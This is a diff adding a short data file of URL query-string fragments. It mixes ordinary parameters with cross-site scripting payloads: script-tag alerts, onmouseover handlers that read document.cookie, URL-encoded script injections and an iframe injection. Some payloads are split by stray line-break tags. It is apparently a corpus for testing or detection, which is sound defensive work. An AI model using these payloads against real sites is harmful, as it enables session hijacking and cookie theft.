@@ -1,0 +1,17 @@
+ring=yaoi28
+mode=navigation&amp;categoryid=1141
+lang=en
+ring=bettie
+cid=1691
+chwchw
+site=message&msg=<script>alert(1)</script>
+Itemid=%22onmouseover=alert%28document.cookie%29%20bad=%22
+uilang=en%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%<br/>3E
+msg=<ScRiPt>alert('LastRider-CyberBellona')</ScRiPt>
+q="><script>alert('Xss By Atm0n3r')</script>&submit=Rechercher
+q=/"><script>alert('Xss By Atm0n3r')</script>
+taal=nl&zoektext=%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript<br/>%3E
+d=%22%20onmouseover%3dalert%28document.c<br/>ookie%29%20abc%3d%22&dayend=23&daystart=23&doSearch=true&endDate=2012-03-06&gid=1&monthend=3&monthst<br/>art=3&range=1&startDate=2000-10-19&Submit2=search&yearend=1967&yearstart=1967
+buscar=+%2F%2F%22%3E%27%3E%3CSCRIPT%3Ea<br/>lert%28%22[_UR0B0R0X_]%22%29%3C%2FSCRIPT%3E
+q=%3Ciframe+src%3D%22http%3A%2F%2Fxssed.com%22%3E
+NTUTis1ab
